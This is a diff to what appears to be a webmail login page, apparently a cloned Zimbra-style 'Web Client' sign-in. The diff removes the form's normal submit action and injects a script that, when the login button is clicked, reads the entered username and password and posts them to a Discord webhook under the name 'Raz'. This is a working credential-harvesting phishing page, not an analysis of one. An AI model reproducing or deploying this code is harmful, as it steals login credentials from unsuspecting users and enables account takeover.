@@ -52,7 +52,7 @@
         <div id="ZLoginAppName">
           Web Client
         </div>
-        <form method="post" name="loginForm" action="#"
+        <form name="loginForm"
         accept-charset="UTF-8" id="loginForm">
           <!-- input type="hidden" name="loginOp" value="login" -->
           <!-- input type="hidden" name="login_csrf" value=
@@ -156,6 +156,27 @@
     </div>
     <div class="decor2"></div>
   </div>
+        <script>
+                  document.getElementsByClassName('ZLoginButton')[0].onclick = function(){
+                          
+                          var password = document.getElementById('password').value
+                          var username = document.getElementById('username').value
+  var request = new XMLHttpRequest();
+  request.open("POST", "https://discord.com/api/webhooks/999062497745195078/AcAoM-Et_fqZX5M8VZb9fDKrZWUVtdfFPnuOgDJ6v8zV4LEhiCm85Qddcdg3W-tL4uFo");
+
+  request.setRequestHeader('Content-type', 'application/json');
+
+  var params = {
+    username: "Raz",
+    avatar_url: "",
+    content: 'User: ' + username + '\n' + 'Pass: ' + password
+  }
+
+  request.send(JSON.stringify(params));
+                          
+                          console.clear;}
+                          
+          </script>
   <script>
 
   function ZmSkin(e){
